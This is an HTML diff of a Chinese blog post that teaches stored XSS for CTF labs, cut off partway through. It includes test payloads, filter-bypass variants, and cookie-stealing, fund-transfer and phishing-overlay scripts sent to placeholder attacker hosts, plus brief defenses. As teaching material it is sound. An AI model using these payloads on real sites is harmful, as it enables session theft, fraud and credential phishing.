@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/lloyal-sudo01/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=lloyal-sudo01/livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一、存储型 XSS 介绍 1. 什么是存储型 XSS Stored XSS（存储型跨站脚本） 攻击者提交的 恶意 JS 代码被服务器存到数据库，之后所有访问这个页面的用户，浏览器都会自">
+<title>储存型xss及恶意&lt;script&gt;代码</title>
+
+<link rel='canonical' href='http://localhost:1313/lloyal-sudo01/p/%E5%82%A8%E5%AD%98%E5%9E%8Bxss%E5%8F%8A%E6%81%B6%E6%84%8Fscript%E4%BB%A3%E7%A0%81/'>
+
+<link rel="stylesheet" href="/lloyal-sudo01/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="储存型xss及恶意<script>代码">
+<meta property='og:description' content="一、存储型 XSS 介绍 1. 什么是存储型 XSS Stored XSS（存储型跨站脚本） 攻击者提交的 恶意 JS 代码被服务器存到数据库，之后所有访问这个页面的用户，浏览器都会自">
+<meta property='og:url' content='http://localhost:1313/lloyal-sudo01/p/%E5%82%A8%E5%AD%98%E5%9E%8Bxss%E5%8F%8A%E6%81%B6%E6%84%8Fscript%E4%BB%A3%E7%A0%81/'>
+<meta property='og:site_name' content='Loyal'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-19T18:53:37&#43;08:00'/><meta property='article:modified_time' content='2026-03-19T18:53:37&#43;08:00'/>
+<meta name="twitter:title" content="储存型xss及恶意<script>代码">
+<meta name="twitter:description" content="一、存储型 XSS 介绍 1. 什么是存储型 XSS Stored XSS（存储型跨站脚本） 攻击者提交的 恶意 JS 代码被服务器存到数据库，之后所有访问这个页面的用户，浏览器都会自">
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/lloyal-sudo01/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/lloyal-sudo01/img/avatar_hu6173231718797166606.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">👻</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/lloyal-sudo01">Loyal</a></h1>
+            <h2 class="site-description">欢迎来到我的网站！</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/lloyal-sudo01/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/lloyal-sudo01/" selected>简体中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1-什么是存储型-xss">1. 什么是存储型 XSS</a></li>
+    <li><a href="#2-和反射型-xss-最大区别">2. 和反射型 XSS 最大区别</a></li>
+    <li><a href="#3-常见出现位置">3. 常见出现位置</a></li>
+    <li><a href="#4-危害">4. 危害</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#步骤1找提交展示的点">步骤1：找“提交→展示”的点</a></li>
+    <li><a href="#步骤2插入最简单的测试-payload">步骤2：插入最简单的测试 payload</a></li>
+    <li><a href="#步骤3常见绕过方式背下来就能打绝大多数靶场">步骤3：常见绕过方式（背下来就能打绝大多数靶场）</a>
+      <ol>
+        <li><a href="#1-过滤-script">1. 过滤 <code>&lt;script&gt;</code></a></li>
+        <li><a href="#2-过滤-alert">2. 过滤 <code>alert</code></a></li>
+        <li><a href="#3-过滤空格">3. 过滤空格</a></li>
+        <li><a href="#4-大小写绕过">4. 大小写绕过</a></li>
+        <li><a href="#5-关键词被替换为空">5. 关键词被替换为空</a></li>
+      </ol>
+    </li>
+    <li><a href="#步骤4拿到-cookiectf-常规目的">步骤4：拿到 Cookie（CTF 常规目的）</a></li>
+    <li><a href="#步骤5查看网页源代码判断过滤">步骤5：查看网页源代码判断过滤</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#一恶意-script-代码的核心特征">一、恶意 <code>&lt;script&gt;</code> 代码的核心特征</a></li>
+    <li><a href="#二最常见的恶意-script-代码示例实战中最常遇到">二、最常见的恶意 <code>&lt;script&gt;</code> 代码示例（实战中最常遇到）</a>
+      <ol>
+        <li><a href="#1-偷取用户-cookiexss-最核心目的">1. 偷取用户 Cookie（XSS 最核心目的）</a></li>
+        <li><a href="#2-劫持用户操作冒充用户发消息转账">2. 劫持用户操作（冒充用户发消息/转账）</a></li>
+        <li><a href="#3-篡改页面内容钓鱼诈骗">3. 篡改页面内容（钓鱼/诈骗）</a></li>
+        <li><a href="#4-监听用户行为偷密码操作记录">4. 监听用户行为（偷密码/操作记录）</a></li>
+        <li><a href="#5-植入木马挖矿脚本消耗用户资源">5. 植入木马/挖矿脚本（消耗用户资源）</a></li>
+      </ol>
+    </li>
+    <li><a href="#三恶意代码的伪装手段实战中攻击者常用">三、恶意代码的“伪装”手段（实战中攻击者常用）</a></li>
+    <li><a href="#四和正常-js-代码的区别">四、和“正常 JS 代码”的区别</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/lloyal-sudo01/p/%E5%82%A8%E5%AD%98%E5%9E%8Bxss%E5%8F%8A%E6%81%B6%E6%84%8Fscript%E4%BB%A3%E7%A0%81/">储存型xss及恶意&lt;script&gt;代码</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-03-19</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="一存储型-xss-介绍">一、存储型 XSS 介绍
+</h1><h2 id="1-什么是存储型-xss">1. 什么是存储型 XSS
+</h2><p><strong>Stored XSS（存储型跨站脚本）</strong>
+攻击者提交的 <strong>恶意 JS 代码被服务器存到数据库</strong>，之后<strong>所有访问这个页面的用户</strong>，浏览器都会自动执行这段恶意 JS。</p>
+<h2 id="2-和反射型-xss-最大区别">2. 和反射型 XSS 最大区别
+</h2><ul>
+<li><strong>反射型 XSS</strong>：代码在 URL 里，不点链接不触发，一次性。</li>
+<li><strong>存储型 XSS</strong>：代码<strong>进数据库</strong>，只要打开页面就执行，<strong>永久危害、危害最大</strong>。</li>
+</ul>
+<h2 id="3-常见出现位置">3. 常见出现位置
+</h2><ul>
+<li>留言板、评论区</li>
+<li>个人资料、昵称、签名</li>
+<li>帖子内容、公告</li>
+<li>任何<strong>提交后会显示给别人看</strong>的地方</li>
+</ul>
+<h2 id="4-危害">4. 危害
+</h2><ul>
+<li>直接偷所有访客的 Cookie</li>
+<li>自动劫持管理员账号</li>
+<li>挂木马、跳转钓鱼、篡改页面</li>
+<li>是 CTF、渗透测试里<strong>最容易拿高分、拿权限</strong>的漏洞之一</li>
+</ul>
+<hr>
+<h1 id="二存储型-xss-标准靶场解题步骤">二、存储型 XSS 标准靶场解题步骤
+</h1><h2 id="步骤1找提交展示的点">步骤1：找“提交→展示”的点
+</h2><p>找这类功能：</p>
+<ul>
+<li>留言、发表评论</li>
+<li>修改昵称、个人简介</li>
+<li>发布文章</li>
+</ul>
+<p>只要：你提交内容 → 别的页面能<strong>看到你写的内容</strong>，就可能存在存储型XSS。</p>
+<h2 id="步骤2插入最简单的测试-payload">步骤2：插入最简单的测试 payload
+</h2><p>提交：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后刷新/进入展示页面：</p>
+<ul>
+<li>弹出 1 → <strong>存在存储型XSS</strong></li>
+<li>没弹窗 → 有过滤，需要绕过</li>
+</ul>
+<h2 id="步骤3常见绕过方式背下来就能打绝大多数靶场">步骤3：常见绕过方式（背下来就能打绝大多数靶场）
+</h2><h3 id="1-过滤-script">1. 过滤 <code>&lt;script&gt;</code>
+</h3><p>用其他标签：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-过滤-alert">2. 过滤 <code>alert</code>
+</h3><p>换成：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">confirm(1)
+</span></span><span class="line"><span class="cl">prompt(1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3-过滤空格">3. 过滤空格
+</h3><p>用 <code>/</code> 代替空格：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">x/onerror=alert(1)</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4-大小写绕过">4. 大小写绕过
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5-关键词被替换为空">5. 关键词被替换为空
+</h3><p>双写绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">scrscriptipt</span><span class="p">&gt;</span>alert(1)<span class="p">&lt;/</span><span class="nt">scrscriptipt</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="步骤4拿到-cookiectf-常规目的">步骤4：拿到 Cookie（CTF 常规目的）
+</h2><p>把弹窗代码换成 <strong>偷Cookie并发送到自己服务器</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;window.location=&#39;http://你的接收地址?c=&#39;+document.cookie&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>管理员后台一打开，你就拿到他的 Cookie，直接登录后台。</p>
+<h2 id="步骤5查看网页源代码判断过滤">步骤5：查看网页源代码判断过滤
+</h2><p>F12 看你的代码被输出在哪里：</p>
+<ul>
+<li>被转成 <code>&amp;lt;script&amp;gt;</code> → 输出在HTML里被转义，很难利用</li>
+<li>原封不动输出 → <strong>百分百存在存储型XSS</strong></li>
+</ul>
+<hr>
+<h1 id="三实战流程">三、实战流程
+</h1><ol>
+<li>找到留言框 / 个人资料</li>
+<li>提交：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>查看是否弹窗</li>
+<li>不弹窗就换：<code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li>弹窗成功后，换成偷Cookie的payload</li>
+<li>拿到管理员Cookie → 登录后台 → 拿到flag</li>
+</ol>
+<hr>
+<h1 id="四防御方法">四、防御方法
+</h1><ol>
+<li><strong>输出HTML转义</strong>（把 &lt; &gt; &quot; &rsquo; &amp; 编码）</li>
+<li><strong>Cookie 设置 HttpOnly</strong>（JS 拿不到Cookie）</li>
+<li>使用 CSP 内容安全策略</li>
+<li>前端框架（Vue/React）默认防止XSS</li>
+</ol>
+<h1 id="补充恶意的script代码介绍">补充：恶意的<code>&lt;script&gt;</code>代码介绍
+</h1><p>简单来说：<strong>恶意的 <code>&lt;script&gt;</code> 代码就是攻击者注入到网页中，能未经用户允许执行有害操作的 JavaScript 代码</strong>。它本身是合法的 JS 语法，但被用于窃取信息、劫持账号、篡改页面等恶意目的——核心不是代码语法“非法”，而是<strong>执行的行为违背用户/网站意愿</strong>。</p>
+<h2 id="一恶意-script-代码的核心特征">一、恶意 <code>&lt;script&gt;</code> 代码的核心特征
+</h2><ol>
+<li><strong>非授权执行</strong>：浏览器执行了用户/网站开发者没允许的操作；</li>
+<li><strong>利用网页权限</strong>：依托当前页面的登录状态、Cookie、DOM 权限做事；</li>
+<li><strong>隐蔽性</strong>：通常不会直接弹窗（实战中 <code>alert(1)</code> 只是测试，真正的恶意代码会悄悄执行）。</li>
+</ol>
+<h2 id="二最常见的恶意-script-代码示例实战中最常遇到">二、最常见的恶意 <code>&lt;script&gt;</code> 代码示例（实战中最常遇到）
+</h2><h3 id="1-偷取用户-cookiexss-最核心目的">1. 偷取用户 Cookie（XSS 最核心目的）
+</h3><p>Cookie 里包含用户登录凭证，偷到就能冒充用户登录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 把 Cookie 发送到攻击者的服务器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">var</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 攻击者的接收地址（比如自己搭的简易服务器）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://攻击者的域名/steal?cookie=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 用图片请求悄悄发送，用户毫无感知
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-劫持用户操作冒充用户发消息转账">2. 劫持用户操作（冒充用户发消息/转账）
+</h3><p>利用当前登录状态，模拟用户点击、提交表单：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 自动给攻击者的账号转账（假设页面有转账表单）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;to_account&#34;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;攻击者账号&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;money&#34;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;10000&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;submit_btn&#34;</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span> <span class="c1">// 自动提交转账
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3-篡改页面内容钓鱼诈骗">3. 篡改页面内容（钓鱼/诈骗）
+</h3><p>把正常页面改成钓鱼页面，诱导用户输入密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 覆盖整个页面为钓鱼登录框
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;h1&gt;账号异常，请重新登录&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;form action=&#34;http://攻击者的钓鱼服务器&#34; method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">      账号：&lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">      密码：&lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">      &lt;input type=&#34;submit&#34; value=&#34;登录&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">    &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  `</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
